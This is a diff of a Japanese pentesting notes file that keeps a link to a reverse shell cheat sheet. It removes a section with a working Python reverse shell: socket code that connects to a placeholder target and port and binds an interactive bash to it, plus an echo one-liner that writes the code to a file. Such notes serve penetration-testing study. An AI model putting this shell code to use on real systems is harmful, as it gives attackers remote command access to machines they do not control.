@@ -11,15 +11,3 @@
 ## リバースシェル参考
 [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]
 
-## pythonスクリプトを使用したリバースシェル
-```python
-import socket, subprocess, os
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('<ターゲット>', <ポート>))
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
-p = subprocess.call(["/bin/bash", "-i"])
-```
-ワンライナーで書き込み  
-`echo 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('<ターゲット>', <ポート>)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(["/bin/bash", "-i"])' > test.py`
